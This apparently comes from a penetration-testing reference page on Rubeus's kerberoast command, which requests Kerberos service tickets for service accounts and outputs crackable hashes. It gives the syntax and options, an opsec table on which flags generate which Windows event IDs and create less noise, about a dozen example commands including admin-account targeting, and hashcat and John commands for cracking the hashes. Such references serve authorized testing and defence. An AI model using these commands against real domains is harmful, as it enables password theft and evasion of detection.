{"title": "kerberoast", "source": "rubeus", "source_label": "Rubeus", "path": "kerberoast", "html": "<h1 id=\"kerberoast\">kerberoast</h1>\n<p>Request service tickets for accounts with SPNs set and output crackable hashes. Replaces SharpRoast.</p>\n<h2 id=\"usage\">Usage</h2>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe kerberoast [[/spn:&quot;&lt;spn&gt;&quot;] | [/spns:&lt;file&gt;]] [/user:&lt;username&gt;] [/domain:&lt;domain&gt;] [/dc:&lt;dc-ip&gt;] [/ou:&quot;OU=...&quot;] [/ldaps] [/nowrap] [/outfile:&lt;output&gt;] [/simple] [/aes] [/rc4opsec] [/tgtdeleg] [/ticket:&lt;ticket&gt;] [/stats] [/creduser:&lt;domain&gt;\\&lt;username&gt;] [/credpassword:&lt;password&gt;] [/ldapfilter:&lt;filter&gt;] [/pwdsetafter:MM-dd-yyyy] [/pwdsetbefore:MM-dd-yyyy] [/resultlimit:&lt;n&gt;] [/delay:&lt;ms&gt;] [/jitter:&lt;pct&gt;] [/enterprise] [/autoenterprise] [/nopreauth:&lt;username&gt;]\n</code></pre></div>\n<h2 id=\"options\">Options</h2>\n<ul>\n<li><code>/spn:\"&lt;spn&gt;\"</code> — target a single SPN</li>\n<li><code>/spns:&lt;file&gt;</code> — file or comma-separated list of SPNs</li>\n<li><code>/user:&lt;username&gt;</code> — roast a specific user</li>\n<li><code>/domain:&lt;domain&gt;</code> — target domain (default: current)</li>\n<li><code>/dc:&lt;dc-ip&gt;</code> — domain controller</li>\n<li><code>/ou:\"OU=...\"</code> — restrict to specific OU</li>\n<li><code>/ldaps</code> — use LDAPS (port 636) for queries</li>\n<li><code>/outfile:&lt;output&gt;</code> — write hashes to file</li>\n<li><code>/simple</code> — output hashes only, no metadata</li>\n<li><code>/nowrap</code> — don't line-wrap</li>\n<li><code>/ticket:&lt;ticket&gt;</code> — use existing TGT for roasting (no LDAP needed — works from non-domain-joined)</li>\n<li><code>/tgtdeleg</code> — get TGT via tgtdeleg trick; forces RC4 for AES accounts</li>\n<li><code>/rc4opsec</code> — use tgtdeleg, filter to RC4-only accounts (lowest noise)</li>\n<li><code>/aes</code> — target AES-enabled accounts, request AES tickets</li>\n<li><code>/stats</code> — show statistics only, no ticket requests</li>\n<li><code>/creduser:&lt;domain&gt;\\&lt;username&gt;</code> — alternate LDAP credentials</li>\n<li><code>/credpassword:&lt;password&gt;</code> — password for alternate credentials</li>\n<li><code>/ldapfilter:&lt;filter&gt;</code> — append custom LDAP filter (e.g. <code>admincount=1</code>)</li>\n<li><code>/pwdsetafter:MM-dd-yyyy</code> — only accounts with password set after date</li>\n<li><code>/pwdsetbefore:MM-dd-yyyy</code> — only accounts with password set before date</li>\n<li><code>/resultlimit:&lt;n&gt;</code> — limit number of results</li>\n<li><code>/delay:&lt;ms&gt;</code> — milliseconds between TGS requests</li>\n<li><code>/jitter:&lt;pct&gt;</code> — % jitter on delay (1-100)</li>\n<li><code>/enterprise</code> — treat SPNs as enterprise principals (user@domain)</li>\n<li><code>/autoenterprise</code> — auto-retry with enterprise principal on SPN failure</li>\n<li><code>/nopreauth:&lt;username&gt;</code> — send AS-REQ instead of TGS-REQ (generates 4768 not 4769)</li>\n</ul>\n<h2 id=\"opsec-comparison\">Opsec Comparison</h2>\n<table>\n<thead>\n<tr>\n<th>Flag(s)</th>\n<th>Behavior</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>(none)</td>\n<td><code>KerberosRequestorSecurityToken</code> method, highest supported enctype</td>\n</tr>\n<tr>\n<td><code>/tgtdeleg</code></td>\n<td>GSS-API TGT, request RC4 for AES accounts</td>\n</tr>\n<tr>\n<td><code>/ticket:&lt;ticket&gt;</code></td>\n<td>Use supplied TGT, request RC4</td>\n</tr>\n<tr>\n<td><code>/rc4opsec</code></td>\n<td>tgtdeleg + filter to RC4-only accounts</td>\n</tr>\n<tr>\n<td><code>/aes</code></td>\n<td>Request AES tickets via <code>KerberosRequestorSecurityToken</code></td>\n</tr>\n<tr>\n<td><code>/aes /tgtdeleg</code></td>\n<td>tgtdeleg + AES accounts + AES tickets</td>\n</tr>\n<tr>\n<td><code>/nopreauth:&lt;user&gt;</code></td>\n<td>AS-REQ not TGS-REQ — 4768 vs 4769 events</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"examples\">Examples</h2>\n<div class=\"highlight\"><pre><span></span><code># Roast all kerberoastable users (default)\nRubeus.exe kerberoast\n\n# Roast all, output to file\nRubeus.exe kerberoast /outfile:&lt;output&gt;\n\n# Roast specific user\nRubeus.exe kerberoast /user:&lt;username&gt; /simple /nowrap\n\n# Roast with existing TGT (from non-domain-joined host)\nRubeus.exe kerberoast /ticket:&lt;ticket&gt; /spn:&quot;&lt;spn&gt;&quot; /dc:&lt;dc-ip&gt;\n\n# Opsec roasting (RC4-only accounts, tgtdeleg TGT)\nRubeus.exe kerberoast /rc4opsec /nowrap\n\n# AES roasting\nRubeus.exe kerberoast /aes /nowrap\n\n# Custom LDAP filter (admin accounts only)\nRubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; /nowrap\n\n# Filter by password age, limit results\nRubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5\n\n# Rate-limited roasting\nRubeus.exe kerberoast /delay:5000 /jitter:30\n\n# Cross-domain\nRubeus.exe kerberoast /domain:&lt;domain&gt; /nowrap\n\n# With alternate creds\nRubeus.exe kerberoast /creduser:&lt;domain&gt;\\&lt;username&gt; /credpassword:&lt;password&gt;\n\n# Stats only (no ticket requests)\nRubeus.exe kerberoast /stats\n\n# Nopreauth-based roasting (AS-REQ)\nRubeus.exe kerberoast /spn:&quot;&lt;spn&gt;&quot; /nopreauth:&lt;username&gt; /domain:&lt;domain&gt; /dc:&lt;dc-ip&gt;\n</code></pre></div>\n<h2 id=\"crack-hashes\">Crack Hashes</h2>\n<div class=\"highlight\"><pre><span></span><code># Hashcat\nhashcat -m 13100 hashes.txt wordlist.txt    # RC4 ($krb5tgs$23$)\nhashcat -m 19600 hashes.txt wordlist.txt    # AES128 ($krb5tgs$17$)\nhashcat -m 19700 hashes.txt wordlist.txt    # AES256 ($krb5tgs$18$)\n\n# John\njohn --wordlist=wordlist.txt hashes.txt\n</code></pre></div>", "excerpt": "kerberoast Request service tickets for accounts with SPNs set and output crackable hashes. Replaces SharpRoast. Usage Rubeus.exe kerberoast [[/spn:&quot;&lt;spn&gt;&quot;] | [/spns:&lt;file&gt;]] [/user:&lt;username&gt;] [/domain:&lt;domain&gt;]…", "tags": []}